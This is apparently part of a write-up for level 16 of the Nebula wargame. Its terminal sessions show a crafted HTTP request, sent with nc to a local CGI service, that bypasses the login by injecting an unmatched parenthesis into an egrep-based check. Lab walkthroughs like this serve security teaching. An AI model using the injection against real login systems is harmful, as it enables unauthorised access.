Failed login:
```
level16@nebula:/home/flag16$ echo -ne "GET /index.cgi?username=foo&password=bar HTTP/1.1\r\nHost: localhost:1616\r\n\r\n" | nc localhost 1616
HTTP/1.0 200 OK
Content-type: text/html

<html><head><title>Login resuls</title></head><body>Your login failed<br/>Would you like a cookie?<br/><br/></body></html>
```

egrep error behaviour (stderr):
```
level16@nebula:/home/flag16$ egrep '(' /home/flag16/userdb.txt
egrep: Unmatched ( or \(
```

```
level16@nebula:/home/flag16$ echo -ne "GET /index.cgi?username=(&password= HTTP/1.1\r\nHost: localhost:1616\r\n\r\n" | nc localhost 1616
HTTP/1.0 200 OK
Content-type: text/html

<html><head><title>Login resuls</title></head><body>Your login was accepted<br/>Would you like a cookie?<br/><br/></body></html>
```

## References

* http://perldoc.perl.org/perlop.html#Regexp-Quote-Like-Operators
